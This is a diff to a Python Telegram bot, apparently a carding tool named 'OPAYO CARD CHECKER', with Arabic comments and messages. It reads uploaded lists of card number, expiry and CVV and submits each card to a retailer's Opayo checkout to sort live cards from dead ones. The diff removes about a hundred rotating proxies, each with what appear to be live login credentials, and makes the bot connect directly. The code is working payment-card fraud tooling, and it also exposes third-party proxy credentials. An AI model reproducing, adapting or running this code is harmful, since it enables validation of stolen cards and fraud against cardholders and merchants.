@@ -54,121 +54,6 @@ initial_cookies = {
     'wtstp_rla': '948385406878459%2C2%2C1761910402918',
 }
 
-# ========== قائمة البروكسيات ==========
-PROXIES = [
-    "82.21.224.53:6409:wikniadi:5nhj034pwe2b",
-    "82.29.229.58:6413:wikniadi:5nhj034pwe2b",
-    "82.25.216.252:7094:wikniadi:5nhj034pwe2b",
-    "23.27.184.56:5657:wikniadi:5nhj034pwe2b",
-    "23.27.138.191:6292:wikniadi:5nhj034pwe2b",
-    "82.22.210.10:7852:wikniadi:5nhj034pwe2b",
-    "23.27.184.66:5667:wikniadi:5nhj034pwe2b",
-    "82.21.224.144:6500:wikniadi:5nhj034pwe2b",
-    "23.27.138.3:6104:wikniadi:5nhj034pwe2b",
-    "82.24.224.121:5477:wikniadi:5nhj034pwe2b",
-    "23.27.138.52:6153:wikniadi:5nhj034pwe2b",
-    "23.27.138.7:6108:wikniadi:5nhj034pwe2b",
-    "82.25.216.253:7095:wikniadi:5nhj034pwe2b",
-    "82.29.225.124:5979:wikniadi:5nhj034pwe2b",
-    "82.29.225.234:6089:wikniadi:5nhj034pwe2b",
-    "46.203.159.11:6612:wikniadi:5nhj034pwe2b",
-    "23.27.184.19:5620:wikniadi:5nhj034pwe2b",
-    "82.25.216.58:6900:wikniadi:5nhj034pwe2b",
-    "82.29.229.17:6372:wikniadi:5nhj034pwe2b",
-    "82.29.225.147:6002:wikniadi:5nhj034pwe2b",
-    "82.25.216.82:6924:wikniadi:5nhj034pwe2b",
-    "82.29.225.162:6017:wikniadi:5nhj034pwe2b",
-    "82.22.220.147:5502:wikniadi:5nhj034pwe2b",
-    "82.29.226.49:7391:wikniadi:5nhj034pwe2b",
-    "82.22.217.78:5420:wikniadi:5nhj034pwe2b",
-    "82.29.226.142:7484:wikniadi:5nhj034pwe2b",
-    "23.27.184.34:5635:wikniadi:5nhj034pwe2b",
-    "82.22.210.191:8033:wikniadi:5nhj034pwe2b",
-    "46.203.159.219:6820:wikniadi:5nhj034pwe2b",
-    "82.24.224.176:5532:wikniadi:5nhj034pwe2b",
-    "82.24.224.214:5570:wikniadi:5nhj034pwe2b",
-    "82.29.226.141:7483:wikniadi:5nhj034pwe2b",
-    "23.27.138.141:6242:wikniadi:5nhj034pwe2b",
-    "46.203.159.243:6844:wikniadi:5nhj034pwe2b",
-    "82.29.225.96:5951:wikniadi:5nhj034pwe2b",
-    "23.27.138.4:6105:wikniadi:5nhj034pwe2b",
-    "82.21.224.55:6411:wikniadi:5nhj034pwe2b",
-    "23.27.138.174:6275:wikniadi:5nhj034pwe2b",
-    "82.22.220.98:5453:wikniadi:5nhj034pwe2b",
-    "82.25.216.243:7085:wikniadi:5nhj034pwe2b",
-    "23.27.184.65:5666:wikniadi:5nhj034pwe2b",
-    "82.21.224.157:6513:wikniadi:5nhj034pwe2b",
-    "23.27.184.126:5727:wikniadi:5nhj034pwe2b",
-    "82.22.220.19:5374:wikniadi:5nhj034pwe2b",
-    "66.63.180.86:5610:wikniadi:5nhj034pwe2b",
-    "82.29.225.186:6041:wikniadi:5nhj034pwe2b",
-    "82.27.214.80:6422:wikniadi:5nhj034pwe2b",
-    "82.21.224.4:6360:wikniadi:5nhj034pwe2b",
-    "82.22.210.232:8074:wikniadi:5nhj034pwe2b",
-    "23.27.138.106:6207:wikniadi:5nhj034pwe2b",
-    "82.29.226.36:7378:wikniadi:5nhj034pwe2b",
-    "82.29.226.25:7367:wikniadi:5nhj034pwe2b",
-    "82.29.226.157:7499:wikniadi:5nhj034pwe2b",
-    "82.22.217.47:5389:wikniadi:5nhj034pwe2b",
-    "82.24.224.150:5506:wikniadi:5nhj034pwe2b",
-    "82.27.214.169:6511:wikniadi:5nhj034pwe2b",
-    "82.29.226.160:7502:wikniadi:5nhj034pwe2b",
-    "82.21.224.129:6485:wikniadi:5nhj034pwe2b",
-    "23.27.138.102:6203:wikniadi:5nhj034pwe2b",
-    "82.22.217.21:5363:wikniadi:5nhj034pwe2b",
-    "82.29.225.57:5912:wikniadi:5nhj034pwe2b",
-    "82.22.217.251:5593:wikniadi:5nhj034pwe2b",
-    "82.25.216.216:7058:wikniadi:5nhj034pwe2b",
-    "46.203.159.236:6837:wikniadi:5nhj034pwe2b",
-    "82.22.210.148:7990:wikniadi:5nhj034pwe2b",
-    "82.22.210.117:7959:wikniadi:5nhj034pwe2b",
-    "82.21.224.110:6466:wikniadi:5nhj034pwe2b",
-    "82.22.217.246:5588:wikniadi:5nhj034pwe2b",
-    "23.27.184.248:5849:wikniadi:5nhj034pwe2b",
-    "46.203.159.89:6690:wikniadi:5nhj034pwe2b",
-    "46.203.159.145:6746:wikniadi:5nhj034pwe2b",
-    "82.27.214.125:6467:wikniadi:5nhj034pwe2b",
-    "82.22.220.158:5513:wikniadi:5nhj034pwe2b",
-    "82.22.217.234:5576:wikniadi:5nhj034pwe2b",
-    "82.22.220.208:5563:wikniadi:5nhj034pwe2b",
-    "82.22.210.222:8064:wikniadi:5nhj034pwe2b",
-    "82.25.216.172:7014:wikniadi:5nhj034pwe2b",
-    "82.25.216.37:6879:wikniadi:5nhj034pwe2b",
-    "82.29.225.168:6023:wikniadi:5nhj034pwe2b",
-    "82.24.224.238:5594:wikniadi:5nhj034pwe2b",
-    "82.25.216.201:7043:wikniadi:5nhj034pwe2b",
-    "23.27.138.224:6325:wikniadi:5nhj034pwe2b",
-    "82.21.224.116:6472:wikniadi:5nhj034pwe2b",
-    "82.22.220.43:5398:wikniadi:5nhj034pwe2b",
-    "82.29.225.240:6095:wikniadi:5nhj034pwe2b",
-    "82.21.224.119:6475:wikniadi:5nhj034pwe2b",
-    "82.24.224.202:5558:wikniadi:5nhj034pwe2b",
-    "82.22.210.91:7933:wikniadi:5nhj034pwe2b",
-    "82.22.210.79:7921:wikniadi:5nhj034pwe2b",
-    "82.29.226.220:7562:wikniadi:5nhj034pwe2b",
-    "23.27.184.224:5825:wikniadi:5nhj034pwe2b",
-    "82.21.224.251:6607:wikniadi:5nhj034pwe2b",
-    "82.29.225.230:6085:wikniadi:5nhj034pwe2b",
-    "23.27.184.40:5641:wikniadi:5nhj034pwe2b",
-    "23.27.184.77:5678:wikniadi:5nhj034pwe2b",
-    "82.29.226.113:7455:wikniadi:5nhj034pwe2b",
-    "82.22.217.83:5425:wikniadi:5nhj034pwe2b",
-    "66.63.180.183:5707:wikniadi:5nhj034pwe2b",
-    "82.27.214.77:6419:wikniadi:5nhj034pwe2b",
-    "82.24.224.249:5605:wikniadi:5nhj034pwe2b"
-]
-
-def get_random_proxy():
-    """اختيار بروكسي عشوائي"""
-    proxy_line = random.choice(PROXIES)
-    parts = proxy_line.split(':')
-    ip, port, user, password = parts[0], parts[1], parts[2], parts[3]
-    proxy_url = f"http://{user}:{password}@{ip}:{port}"
-    return {
-        'http': proxy_url,
-        'https': proxy_url
-    }
-
 # ========== إحصائيات ==========
 stats = {
     'total': 0,
@@ -187,7 +72,7 @@ stats = {
     'cards_checked': 0,
     'approved_cards': [],
     'ccn_cards': [],
-    'current_proxy': ''
+    'current_proxy': 'Direct (No Proxy)'
 }
 
 # ========== Opayo Functions ==========
@@ -218,12 +103,11 @@ def analyze_response(html_content):
     
     return "UNKNOWN", "Unknown Response"
 
-def get_opayo_cookies(proxy_dict):
+def get_opayo_cookies():
     """استخراج كوكيز Opayo من التدفق"""
     s = requests.Session()
     s.headers.update({"User-Agent": UA, "Referer": "https://www.rapidonline.com/checkout/order/redirect?pEx=4"})
     s.cookies.update(initial_cookies)
-    s.proxies = proxy_dict
     
     try:
         r = s.get(BASKET_URL, params=PARAMS, timeout=30)
@@ -367,12 +251,11 @@ async def check_card(card, bot_app, chat_id):
     
     cvv = cvv.strip()
     
-    # Get random proxy
-    proxy_dict = get_random_proxy()
-    stats['current_proxy'] = list(proxy_dict.values())[0].split('@')[1] if proxy_dict else 'No Proxy'
+    # No proxy
+    stats['current_proxy'] = 'Direct (No Proxy)'
     
-    # Get fresh cookies with proxy
-    opayo_cookies = get_opayo_cookies(proxy_dict)
+    # Get fresh cookies
+    opayo_cookies = get_opayo_cookies()
     if not opayo_cookies:
         stats['errors'] += 1
         stats['error_details']['COOKIE_ERROR'] = stats['error_details'].get('COOKIE_ERROR', 0) + 1
@@ -422,7 +305,6 @@ async def check_card(card, bot_app, chat_id):
             cookies=opayo_cookies,
             headers=headers_card,
             data=data_card,
-            proxies=proxy_dict,
             verify=False,
             timeout=30
         )
@@ -510,7 +392,7 @@ async def update_dashboard(bot_app, chat_id):
             await bot_app.bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=stats['dashboard_message_id'],
-                text="📊 **OPAYO CARD CHECKER - LIVE WITH PROXIES** 📊",
+                text="📊 **OPAYO CARD CHECKER - DIRECT CONNECTION** 📊",
                 reply_markup=create_dashboard_keyboard(),
                 parse_mode='Markdown'
             )
@@ -555,12 +437,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     await update.message.reply_text(
-        "📊 **OPAYO CARD CHECKER BOT WITH PROXIES**\n\n"
+        "📊 **OPAYO CARD CHECKER BOT - DIRECT**\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
         "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
         "✅ سيتم عرض النتائج هنا مباشرة\n"
-        "🌐 كل طلب سيستخدم بروكسي عشوائي\n"
-        f"📡 عدد البروكسيات المتاحة: {len(PROXIES)}",
+        "🌐 بدون بروكسي (اتصال مباشر)",
         parse_mode='Markdown'
     )
 
@@ -590,14 +471,14 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'cards_checked': 0,
         'approved_cards': [],
         'ccn_cards': [],
-        'current_proxy': '',
+        'current_proxy': 'Direct (No Proxy)',
         'start_time': datetime.now(),
         'is_running': True,
         'chat_id': update.effective_chat.id
     })
     
     dashboard_msg = await update.message.reply_text(
-        "📊 **OPAYO CARD CHECKER - LIVE WITH PROXIES** 📊",
+        "📊 **OPAYO CARD CHECKER - DIRECT CONNECTION** 📊",
         reply_markup=create_dashboard_keyboard(),
         parse_mode='Markdown'
     )
@@ -606,7 +487,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"✅ تم بدء الفحص!\n\n"
         f"📊 إجمالي البطاقات: {len(cards)}\n"
-        f"🌐 البروكسيات المتاحة: {len(PROXIES)}\n"
         f"📢 تابع النتائج أدناه",
         parse_mode='Markdown'
     )
@@ -671,7 +551,7 @@ async def process_cards(cards, bot_app, chat_id):
         "╚═══════════════════╝\n\n"
         "✅ تم إرسال جميع الملفات\n"
         "📊 شكراً لاستخدامك البوت!\n\n"
-        "⚡️ Opayo Gateway with Random Proxies"
+        "⚡️ Opayo Gateway - Direct Connection"
     )
     
     await bot_app.bot.send_message(
@@ -700,8 +580,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_text("🛑 تم إيقاف الفحص!")
 
 def main():
-    print("[🤖] Starting Opayo Telegram Bot with Random Proxies...")
-    print(f"[🌐] Loaded {len(PROXIES)} proxies")
+    print("[🤖] Starting Opayo Telegram Bot - Direct Connection...")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
@@ -710,7 +589,7 @@ def main():
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.add_handler(CallbackQueryHandler(button_callback))
     
-    print("[✅] Bot is running with proxy rotation...")
+    print("[✅] Bot is running without proxies...")
     app.run_polling()
 
 if __name__ == "__main__":
